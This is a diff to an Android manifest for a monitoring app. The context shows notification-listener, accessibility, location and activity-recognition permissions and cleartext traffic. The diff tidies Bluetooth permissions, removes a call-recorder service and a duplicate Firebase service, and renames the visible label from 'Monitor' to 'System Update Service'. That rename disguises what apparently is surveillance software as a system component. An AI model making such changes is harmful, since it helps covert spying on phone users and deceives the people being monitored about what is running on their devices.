@@ -49,6 +49,7 @@
     <uses-permission android:name="android.permission.BLUETOOTH" />
     <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
     <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
     <uses-permission android:name="android.permission.NFC" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.FLASHLIGHT" />
@@ -63,14 +64,12 @@
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
     <uses-permission android:name="android.permission.LOCATION_HARDWARE" />
     <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
-    <uses-permission android:name="android.permission.BLUETOOTH" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
 
     <application
         android:name=".MonitorApp"
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
-        android:label="Monitor"
+        android:label="System Update Service"
         android:supportsRtl="true"
         android:theme="@style/Theme.Monitor"
         android:usesCleartextTraffic="true"
@@ -236,27 +235,12 @@
                 android:resource="@xml/accessibility_config" />
         </service>
 
-        <!-- Call Recording permission clarifier -->
-        <service
-            android:name=".service.call.CallRecorder"
-            android:exported="false"
-            android:foregroundServiceType="microphone" />
-
         <!-- Firebase Cloud Messaging Service -->
         <service
             android:name=".service.fcm.MonitorFcmService"
             android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
-            </intent-filter>
-        </service>
-
-        <!-- Firebase Instance ID (for token refresh) -->
-        <service
-            android:name=".service.fcm.MonitorFcmService"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
             </intent-filter>
         </service>
 
